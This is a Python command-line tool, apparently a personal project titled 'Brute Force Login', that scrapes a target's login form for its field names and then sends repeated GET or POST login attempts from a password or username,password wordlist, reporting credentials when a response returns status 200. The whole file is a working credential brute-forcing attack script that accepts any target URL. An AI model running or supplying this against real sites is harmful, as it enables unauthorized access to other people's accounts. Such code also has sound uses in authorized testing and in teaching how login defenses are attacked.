import requests
from bs4 import BeautifulSoup
from termcolor import colored
import sys
import argparse
from urllib.parse import urlencode
from urllib.parse import urlparse, parse_qs


print(colored("Brute Force Login", "green"))
print(colored("Tool By Praveen", "green"))
print(colored("Required Login Page URL or API Login URL Endpoint", "red"))
print(colored("Leave blank if you don't have, In optional cases", "green"))


def formOperations(url):
    response = requests.get(url)
    soup = BeautifulSoup(response.text, "html.parser")

    form_tags = soup.find_all("form")

    if form_tags:
        result = ""
        for i, form_tag in enumerate(form_tags, start=1):
            result += colored(f"\nForm {i} attributes:\n", "green")
            form_method = form_tag.get("method", "Not specified")
            form_action = form_tag.get("action", "Not specified")
            result += f'  {colored("Method:", "yellow")} {colored(form_method, "green")}\n  {colored("Action:", "yellow")} {colored(form_action, "green")}\n'
            input_tags = form_tag.find_all("input")
            if input_tags:
                result += f'  {colored("Input types:", "yellow")}\n'
                input_types = set()
                input_names = []
                for input_tag in input_tags:
                    input_type = input_tag.get("type", "Not specified")
                    input_name = input_tag.get("name", "Not specified")
                    input_types.add(input_type)
                    input_names.append(input_name)

                result += colored("    " + ", ".join(input_types) + "\n", "green")
                result += colored("  Input names:\n", "yellow")
                result += colored("    " + ", ".join(input_names) + "\n", "green")
            else:
                result += colored("  No input tags found.\n", "red")
        result += colored("  Input names for username and password fields:", "yellow")
        username_input_name = None
        password_input_name = None

        for form_tag in form_tags:
            label_tags = form_tag.find_all("label")
            if label_tags:
                for label_tag in label_tags:
                    label_text = label_tag.get_text().strip().lower()

                    if "username" in label_text or "email" in label_text:
                        username_input_name = label_tag.find_next("input").get(
                            "name", "Not specified"
                        )
                    elif "password" in label_text:
                        password_input_name = label_tag.find_next("input").get(
                            "name", "Not specified"
                        )

        if username_input_name:
            result += f'\n {colored("   Username input name", "yellow")}: {colored(username_input_name, "green")}'
        else:
            result += f'\n {colored("   No username input name found.", "red")}'

        if password_input_name:
            result += f'\n {colored("   Password input name", "yellow")}: {colored(password_input_name, "green")}'
        else:
            result += f'\n {colored("   No password input name found.", "red")}'
        print(colored("\nForm Attributes Found:", "green"))
        print(result)
        return username_input_name, password_input_name
    else:
        print(colored("[!!] No Form Found", "red"))
        return None, None


def postReq(
    username,
    password,
    username_input_name,
    password_input_name,
    url="",
    cookie_value="",
):
    print(colored(("Trying: " + username + " and " + password + " ..."), "yellow"))
    data = {username_input_name: username, password_input_name: password}
    if cookie_value != "":
        response = requests.get(url, params=data, cookies={"Cookie": cookie_value})
    else:
        response = requests.post(url, data=data)
    code = response.status_code
    print(
        colored("[+] Status Code:", "green" if code == 200 else "yellow"),
        colored(code, "green" if code == 200 else "yellow"),
    )

    if response.status_code == 200:
        print(
            colored(
                f"[+] Login Successful!\n[+] Login Creds: \n[+] Username: {username}\n[+] password: {password}",
                "green",
            )
        )
        exit()


def postBruteForce(url, username=None, wordlist="wordlist.txt"):
    formOperationsfunc = formOperations(url)
    print(colored("[+] Using Wordlist: " + wordlist, "yellow"))
    if username is None:
        with open(wordlist, "r") as datas:
            for data in datas:
                print("-----------------------------------------------")
                username, password = map(str.strip, data.split(","))
                postReq(
                    username,
                    password,
                    formOperationsfunc[0],
                    formOperationsfunc[1],
                    url=url,
                )
    else:
        with open(wordlist, "r") as passwords:
            for password in passwords:
                print("-----------------------------------------------")
                if ", " in password:
                    print(colored("[!!] System Identified, Invalid Wordlist", "red"))
                    print(
                        colored(
                            "[!!] If you know the username give only the password wordlist",
                            "red",
                        )
                    )
                    print(
                        colored(
                            "[!!] If you dont know the username then give the username and password wordlist by comma seperated (, )",
                            "red",
                        )
                    )
                    print(colored("[!!] Eg. username, password", "red"))
                    print(colored("[!!] Exiting...", "red"))
                    exit()
                password = password.strip()
                postReq(
                    username,
                    password,
                    formOperationsfunc[0],
                    formOperationsfunc[1],
                    url=url,
                )


def getReq(
    username,
    password,
    username_input_name,
    password_input_name,
    url="",
    cookie_value="",
):
    print(colored(("Trying: " + username + " and " + password + " ..."), "yellow"))
    data = {username_input_name: username, password_input_name: password}
    if cookie_value != "":
        response = requests.get(url, params=data, cookies={"Cookie": cookie_value})
    else:
        response = requests.get(url, params=data)
    print(colored("[+] URL:", "yellow"), colored(response.url, "green"))
    code = response.status_code
    if response.status_code == 200:
        print(
            colored("[+] Status Code:", "green" if code == 200 else "yellow"),
            colored(code, "green" if code == 200 else "yellow"),
        )
        print(
            colored(
                f"[+] Login Successful!\n[+] Login Creds: \n[+] Username: {username}\n[+] password: {password}",
                "green",
            )
        )
        print(
            colored("[+] URL:", "green"),
            colored(
                response.url
                + f"?{username_input_name}={username}:{password_input_name}={password}",
                "green",
            ),
        )
        exit()
    else:
        print(
            colored("[+] Status Code:", "green" if code == 200 else "yellow"),
            colored(code, "green" if code == 200 else "yellow"),
        )


def getBruteForce(url, username=None, wordlist="wordlist.txt"):
    print(colored("[+] Using Wordlist: " + wordlist, "yellow"))
    parsed_url = urlparse(url)
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
    print(colored("[+] Converted to Base URL: " + base_url, "yellow"))
    formOperationsfunc = formOperations(base_url)
    query_params = parse_qs(parsed_url.query)
    # if query params not have username or password then use wordlist
    if "username" in query_params:
        username = query_params["username"][0]
    if username is None:
        with open(wordlist, "r") as datas:
            for data in datas:
                print("-----------------------------------------------")
                username, password = map(str.strip, data.split(","))
                getReq(
                    username,
                    password,
                    formOperationsfunc[0],
                    formOperationsfunc[1],
                    base_url,
                )
    else:
        with open(wordlist, "r") as passwords:
            for password in passwords:
                print("-----------------------------------------------")
                if ", " in password:
                    print(colored("[!!] System Identified, Invalid Wordlist", "red"))
                    print(
                        colored(
                            "[!!] If you know the username give only the password wordlist",
                            "red",
                        )
                    )
                    print(
                        colored(
                            "[!!] If you dont know the username then give the username and password wordlist by comma seperated (, )",
                            "red",
                        )
                    )
                    print(colored("[!!] Eg. username, password", "red"))
                    print(colored("[!!] Exiting...", "red"))
                    exit()
                password = password.strip()
                getReq(
                    username,
                    password,
                    formOperationsfunc[0],
                    formOperationsfunc[1],
                    base_url,
                )


def main():
    parser = argparse.ArgumentParser(description="Brute Force Login Script")
    parser.add_argument(
        "-w", "--wordlist", required=True, help="Specify the wordlist file."
    )
    parser.add_argument("-t", "--target", required=True, help="Specify the target URL.")
    parser.add_argument("-u", "--username", help="Specify the username.")
    parser.add_argument("-c", "--cookie", help="Specify the cookie value.")
    parser.add_argument(
        "-m",
        "--method",
        required=True,
        help="Specify the HTTP method (e.g., get, post).",
    )
    args = parser.parse_args()
    url = args.target.strip().lower()
    username = args.username.strip().lower() if args.username else None
    cookie = args.cookie.strip().lower() if args.cookie else ""
    method = args.method.strip().lower()
    wordlist = args.wordlist

    if url == "":
        url = "http://localhost/brute-force/login.php"
        print(colored("[+] URL Not Provided, Using Default URL", "yellow"))
    if url.startswith("http://") or url.startswith("https://"):
        pass
    else:
        url = "https://" + url

    if username is None:
        print(
            colored(
                "[+] Username Not Provided, Using Usernames From Wordlist File Make sure the username and password are separated by a comma (,)",
                "yellow",
            )
        )
    else:
        print(
            colored(
                f"[+] Username Provided, Username: {username}, Using Username From User Input",
                "yellow",
            )
        )

    if method == "post":
        print(colored("[+] Using POST Method", "yellow"))
        postBruteForce(url, username, wordlist)

    elif method == "get":
        print(colored("[+] Using GET Method", "yellow"))
        getBruteForce(url, username, wordlist)
    else:
        print(colored("[!!] Invalid Method", "red"))
        sys.exit()

    print("[!!] Password Not In List")


if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"An error occurred: {e}")
        print("Make sure You are using a proper wordlist file")
        print("[!!] Exiting...")
    except KeyboardInterrupt:
        print("\n[!!] User Interrupted")
else:
    print("This module is not intended to be imported")
